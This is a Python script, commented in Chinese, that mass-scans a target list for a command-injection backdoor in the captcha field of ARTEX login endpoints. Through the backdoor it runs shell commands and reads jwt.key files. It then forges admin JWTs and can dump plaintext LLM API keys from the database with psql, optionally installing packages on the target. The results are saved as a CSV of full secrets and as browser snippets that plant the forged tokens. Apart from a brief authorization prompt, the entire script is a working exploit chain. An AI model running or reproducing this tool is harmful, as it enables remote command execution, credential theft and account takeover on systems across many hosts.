#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ARTEX 后门批量影响评估（仅用于你拥有或已获授权的内网目标）。

做四件事，全部只读：
    1. 打登录接口的 captcha 后门，确认是否存在（载荷 `!echo <标记>;id`）；
    2. 通过后门读 jwt.key，本地按服务端规则签一个管理员 token；
    3. 用这个 token 调 /api/tools 验证是否被接受，并读 /api/llm 拿到模型配置；
    4. 可选：用后门读数据库里的 llm_profiles（base_url / api_key 明文），默认关闭。

输出：
    屏幕：每个目标的判定、身份、模型信息（密钥打码）
    CSV ：artex_assess_<时间>.csv（含完整 jwt.key / token / 模型 key，注意保密）
    文本：artex_snippets_<时间>.txt（每个目标一段可直接粘进浏览器 Console 的脚本）

用法（url.txt 和脚本放同一目录，直接运行）：
    python artex_backdoor_assess.py

    --yes            跳过“确认已获授权”的交互提示（计划任务用）
    --threads 4      并发数，默认 4
    --timeout 10     单请求超时秒数
    --with-llm-keys  额外读取数据库里的模型 key（需要目标上有 psql）
    --install-psql   目标没有 psql 时尝试 apt-get 安装（会改动目标，默认不做）

授权声明：脚本会对目标执行 `echo`、`id`、`cat jwt.key` 这类只读命令。
未经授权对他人系统运行属于未授权访问，后果自负。
"""

from __future__ import annotations

import argparse
import base64
import csv
import hashlib
import hmac
import json
import os
import secrets
import ssl
import sys
import time
import urllib.error
import urllib.request
from urllib import error as urlerror
import uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlsplit

LOGIN_ENDPOINTS = ("/api/auth/login", "/api/login")
END = "__HX_END__"
UA = "artex-backdoor-assess/1.0 (authorized internal audit)"

VULN, CLEAN, SUSPECT, NO_API, UNREACHABLE = "存在后门", "未发现", "疑似", "接口不存在", "无法连接"
VULN_NO_SH = "存在后门(无sh)"


# ---------- HTTP ----------

def opener(insecure=True):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))


def request_json(op, url, payload=None, token=None, timeout=10.0):
    data = None
    headers = {"User-Agent": UA, "Accept": "application/json"}
    if payload is not None:
        data = json.dumps(payload).encode()
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=data, headers=headers,
                                 method="POST" if data is not None else "GET")
    try:
        with op.open(req, timeout=timeout) as resp:
            return resp.status, resp.read(400_000).decode("utf-8", "replace"), None
    except urlerror.HTTPError as e:
        return e.code, e.read(400_000).decode("utf-8", "replace"), None
    except Exception as e:
        return None, "", f"{type(e).__name__}: {e}"


def run_cmd(op, login_url, cmd, timeout):
    """走后门执行一条命令，返回 (ok, output)。"""
    status, body, err = request_json(op, login_url, {"username": "probe", "password": secrets.token_hex(6),
                                                     "captcha": "!" + cmd}, timeout=timeout)
    if err or status != 200:
        return False, f"HTTP {status} {err or body[:120]}"
    try:
        data = json.loads(body)
    except ValueError:
        return False, "响应不是 JSON"
    for k, v in data.items():
        if k.lower() == "captcha" and isinstance(v, str):
            return True, v
    return False, "响应里没有 captcha 字段"


# ---------- 步骤 ----------

def origins_of(raw: str):
    raw = raw.strip().rstrip("/")
    if "://" not in raw:
        raw = "//" + raw
    parts = urlsplit(raw)
    if not parts.netloc:
        return []
    if parts.scheme:
        return [f"{parts.scheme}://{parts.netloc}"]
    return [f"http://{parts.netloc}", f"https://{parts.netloc}"]


def detect(op, origin, timeout):
    marker = "hx" + secrets.token_hex(6)
    cmd = f"echo {marker};id"
    for endpoint in LOGIN_ENDPOINTS:
        status, body, err = request_json(op, origin + endpoint, {"username": "probe",
                                                               "password": secrets.token_hex(6),
                                                               "captcha": "!" + cmd}, timeout=timeout)
        if err:
            return UNREACHABLE, origin + endpoint, "", err
        if status == 404:
            continue
        if status == 200:
            value, exec_err = "", ""
            try:
                data = json.loads(body)
                value = str(data.get("captcha", ""))
                exec_err = str(data.get("error", ""))
            except ValueError:
                pass
            # 后门存在但容器里没有 sh：exec.Command("sh") 直接失败，命令执行不了。
            if exec_err and "sh" in exec_err and "not found" in exec_err:
                return VULN_NO_SH, origin + endpoint, exec_err, "有后门但无 sh，命令通道不可用"
            if marker in value and "!echo" not in value:
                return VULN, origin + endpoint, value.strip(), ""
            return SUSPECT, origin + endpoint, value[:200], "200 但未看到回显"
        return CLEAN, origin + endpoint, "", f"HTTP {status}"
    return NO_API, origin, "", "两个候选登录接口都 404"


def read_jwt_key(op, login_url, timeout):
    cmd = ("cat /app/jwt.key 2>/dev/null; cat /app/data/jwt.key 2>/dev/null; "
           f"cat ./jwt.key 2>/dev/null; echo; echo {END}")
    ok, out = run_cmd(op, login_url, cmd, timeout)
    if not ok:
        return "", out
    lines = [ln.strip() for ln in out.split(END)[0].splitlines()]
    key = "".join(ln for ln in lines if ln and "not found" not in ln and "No such file" not in ln)
    if len(key) < 32:
        return "", f"jwt.key 太短或读不到（{len(key)} 字节）"
    return key, ""


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge(key: str, days=7) -> str:
    now = int(time.time())
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": "ARTEX", "iat": now, "exp": now + days * 86400, "jti": uuid.uuid4().hex[:16]}
    signing_input = (b64url(json.dumps(header, separators=(",", ":")).encode()) + "." +
                     b64url(json.dumps(payload, separators=(",", ":")).encode()))
    sig = hmac.new(key.encode(), signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def read_llm_api(op, origin, token, timeout):
    status, body, err = request_json(op, origin + "/api/llm", token=token, timeout=timeout)
    if err or status != 200:
        return {}, f"HTTP {status} {err or ''}"
    try:
        data = json.loads(body)
    except ValueError:
        return {}, "响应不是 JSON"
    return data, ""


def read_llm_keys(op, login_url, timeout, install):
    """可选：从数据库读明文模型 key。返回 (rows, note)。"""
    has_psql = False
    if install:
        ok, _ = run_cmd(op, login_url, "command -v psql >/dev/null 2>&1 || (apt-get update >/dev/null 2>&1; "
                                       "apt-get install -y postgresql-client >/dev/null 2>&1); command -v psql", timeout)
        has_psql = ok
    else:
        ok, out = run_cmd(op, login_url, "command -v psql", timeout)
        has_psql = ok and "psql" in out and "not found" not in out

    if not has_psql:
        return [], "目标没有 psql，未读取数据库里的模型 key（可加 --install-psql）"

    sql = ("select id||'|'||name||'|'||coalesce(format,'')||'|'||coalesce(model,'')||'|'||"
           "coalesce(base_url,'')||'|'||coalesce(proxy,'')||'|'||coalesce(api_key,'') from llm_profiles order by id")
    ok, out = run_cmd(op, login_url, f'psql "$ARTEX_PG_DSN" -Atc "{sql}"', timeout)
    if not ok:
        return [], f"psql 查询失败：{out[:120]}"
    rows = []
    for line in out.splitlines():
        parts = line.split("|")
        if len(parts) >= 7:
            rows.append({"id": parts[0], "name": parts[1], "format": parts[2], "model": parts[3],
                         "base_url": parts[4], "proxy": parts[5], "api_key": parts[6]})
    return rows, "" if rows else "查询成功但没有 profile"


def mask(secret: str) -> str:
    if not secret:
        return ""
    if len(secret) <= 12:
        return secret[:3] + "***"
    return secret[:6] + "…" + secret[-4:]


def snippet(token: str) -> str:
    return ("const t = '" + token + "';\n"
            "localStorage.setItem('artex_token', t);\n"
            "document.cookie = 'artex_token=' + encodeURIComponent(t) + '; path=/; max-age=604800; SameSite=Lax';\n"
            "location.href = '/';")


# ---------- 主流程 ----------

def assess(raw: str, timeout: float, with_llm_keys: bool, install_psql: bool) -> dict:
    row = {"target": raw, "verdict": "", "endpoint": "", "identity": "", "jwt_key": "",
           "token": "", "token_ok": "", "provider": "", "model": "", "base_url": "",
           "proxy": "", "llm_key_hint": "", "llm_key_full": "", "note": ""}
    op = opener()
    origins = origins_of(raw)
    if not origins:
        row["verdict"], row["note"] = UNREACHABLE, "地址格式无法解析"
        return row

    origin, endpoint, verdict, evidence, note = "", "", "", "", ""
    for candidate in origins:
        verdict, endpoint, evidence, note = detect(op, candidate, timeout)
        if verdict != UNREACHABLE:
            origin = candidate
            break
    row.update(verdict=verdict, endpoint=endpoint, note=note)
    if verdict == VULN_NO_SH:
        return row
    if verdict not in (VULN, SUSPECT):
        return row
    row["identity"] = next((ln.strip() for ln in evidence.splitlines() if "uid=" in ln), "")         or (evidence.splitlines()[-1].strip() if evidence else "")

    key, key_err = read_jwt_key(op, endpoint, timeout)
    if not key:
        row["note"] = (row["note"] + "；" + key_err).strip("；")
        return row
    row["jwt_key"] = key
    row["token"] = forge(key)

    status, _, err = request_json(op, origin + "/api/tools", token=row["token"], timeout=timeout)
    row["token_ok"] = "200" if status == 200 else f"HTTP {status}{' ' + err if err else ''}"

    llm, llm_err = read_llm_api(op, origin, row["token"], timeout)
    row["provider"] = str(llm.get("provider", ""))
    row["model"] = str(llm.get("model", ""))
    row["base_url"] = str(llm.get("base_url", ""))
    row["proxy"] = str(llm.get("proxy", ""))
    if llm_err:
        row["note"] = (row["note"] + "；/api/llm: " + llm_err).strip("；")

    if with_llm_keys:
        profiles, key_note = read_llm_keys(op, endpoint, timeout, install_psql)
        if profiles:
            first = profiles[0]
            row["llm_key_full"] = first.get("api_key", "")
            row["llm_key_hint"] = mask(row["llm_key_full"])
            row["base_url"] = row["base_url"] or first.get("base_url", "")
            row["model"] = row["model"] or first.get("model", "")
        if key_note:
            row["note"] = (row["note"] + "；" + key_note).strip("；")
    return row


def main() -> int:
    ap = argparse.ArgumentParser(description="ARTEX 后门批量影响评估（仅限授权目标）")
    ap.add_argument("urls", nargs="?", help="清单文件，默认同目录 url.txt")
    ap.add_argument("--threads", type=int, default=4)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--with-llm-keys", action="store_true", help="从数据库读模型 key（需 psql）")
    ap.add_argument("--install-psql", action="store_true", help="目标无 psql 时尝试安装（会改动目标）")
    ap.add_argument("--yes", action="store_true", help="跳过授权确认")
    args = ap.parse_args()

    base = os.path.dirname(os.path.abspath(__file__))
    path = args.urls or os.path.join(base, "url.txt")
    if not os.path.isabs(path):
        path = os.path.join(os.getcwd(), path)
    if not os.path.isfile(path):
        sys.exit(f"找不到清单：{path}")
    targets = [ln.strip() for ln in open(path, encoding="utf-8-sig", errors="replace")
               if ln.strip() and not ln.strip().startswith("#")]
    if not targets:
        sys.exit("清单是空的")

    if not args.yes:
        print(f"即将对 {len(targets)} 个目标执行只读探测（echo / id / cat jwt.key）。")
        print("请确认这些目标都归你所有或已获得书面授权。")
        if not sys.stdin.isatty():
            sys.exit("非交互环境请加 --yes 明确授权")
        if input("输入 yes 继续：").strip().lower() != "yes":
            sys.exit("已取消")

    print(f"清单：{path}（{len(targets)} 个），线程 {args.threads}，超时 {args.timeout}s\n")
    started = time.time()
    with ThreadPoolExecutor(max_workers=max(1, args.threads)) as pool:
        rows = list(pool.map(lambda t: assess(t, args.timeout, args.with_llm_keys, args.install_psql), targets))

    order = {VULN: 0, VULN_NO_SH: 1, SUSPECT: 2, NO_API: 3, UNREACHABLE: 4, CLEAN: 5}
    rows.sort(key=lambda r: order.get(r["verdict"], 9))

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    csv_path = os.path.join(base, f"artex_assess_{stamp}.csv")
    with open(csv_path, "w", encoding="utf-8-sig", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)

    snip_path = os.path.join(base, f"artex_snippets_{stamp}.txt")
    with open(snip_path, "w", encoding="utf-8") as fh:
        for r in rows:
            if r["verdict"] == VULN and r["token"]:
                fh.write(f"# {r['target']}  身份:{r['identity']}  模型:{r['provider']}/{r['model']}  "
                         f"base_url:{r['base_url'] or '默认官方'}\n")
                fh.write(snippet(r["token"]) + "\n\n")

    for r in rows:
        print(f"[{r['verdict']}] {r['target']}  {r['endpoint']}")
        if r["identity"]:
            print(f"    身份：{r['identity']}")
        if r["jwt_key"]:
            print(f"    jwt.key：{mask(r['jwt_key'])}  token 验证：{r['token_ok']}")
        if r["provider"] or r["model"] or r["base_url"]:
            print(f"    模型：{r['provider']}/{r['model']}  base_url={r['base_url'] or '默认官方'}  "
                  f"proxy={r['proxy'] or '-'}")
        if r["llm_key_hint"]:
            print(f"    模型 key：{r['llm_key_hint']}（完整值在 CSV）")
        if r["note"]:
            print(f"    说明：{r['note']}")
    counts = {}
    for r in rows:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
    print("\n汇总：" + "；".join(f"{k} {v}" for k, v in sorted(counts.items(), key=lambda kv: order.get(kv[0], 9))))
    print(f"耗时 {time.time() - started:.1f}s")
    print(f"CSV：{csv_path}")
    print(f"浏览器注入脚本：{snip_path}")
    print("\n注意：CSV 与 snippets 里是可直接登录的凭据，用完请删除或加密保存。")
    return 2 if any(r["verdict"] in (VULN, VULN_NO_SH) for r in rows) else 0


if __name__ == "__main__":
    sys.exit(main())
